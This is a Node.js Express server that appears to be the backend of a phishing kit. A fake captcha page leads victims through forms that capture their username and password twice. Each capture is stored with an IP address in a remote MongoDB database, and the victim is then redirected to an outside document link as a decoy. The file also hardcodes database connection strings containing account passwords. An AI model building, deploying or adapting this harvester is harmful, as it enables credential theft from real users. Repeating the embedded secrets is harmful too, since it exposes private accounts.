let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let http = require('http');
let app = express();
const IP = require('ip');

app.set("view engine", "ejs")

app.use(bodyParser.urlencoded({
  extended: true
}));

app.use(express.static("public"));

mongoose.set('strictQuery', true);

// mongoose.connect("mongodb+srv://slangley1759:Badhtguy1.@cluster0.vf0nq.mongodb.net/fullpageDB", {
//   useNewUrlParser: true
// });

// mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/fullpage",{
//   useNewUrlParser:true
// });

mongoose.connect("mongodb+srv://prattrenee:Badhtguy1.@cluster0.4qhkjpz.mongodb.net/fullpage",{
  useNewUrlParser:true
});


const userSchema = new mongoose.Schema({
  hidden: String,
  password: String,
  ipAddress:String,
});

const User = new mongoose.model("User", userSchema);

app.get("/", function(req, res) {
var ipAddress = IP.address();
  username = req.query.username;
  res.render("recap");
});

app.post("/", function(req, res) {
  var username = req.body.recapstore;
  res.render("first",{username: username});
})

app.post("/first", function(req, res) {
  const ipAddress = IP.address();
  console.log(ipAddress);
  var username = req.body.username;
  res.render("second", {username: username})
})


app.post("/second", function(req, res) {

  var username = req.body.username;
  var ipAddress = IP.address();
  var ipAddres= ipAddres;

const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
    ipAddress:ipAddress,

  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      res.render("third", {
        username: username
      })
    }
  });

});


app.post("/third", function(req, res) {

  var username = req.body.username;
  const ipAddress = IP.address();

  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
    ipAddress:ipAddress,
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      res.redirect("https://pdf.ac/r2RC5")
    }
  });

});


let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
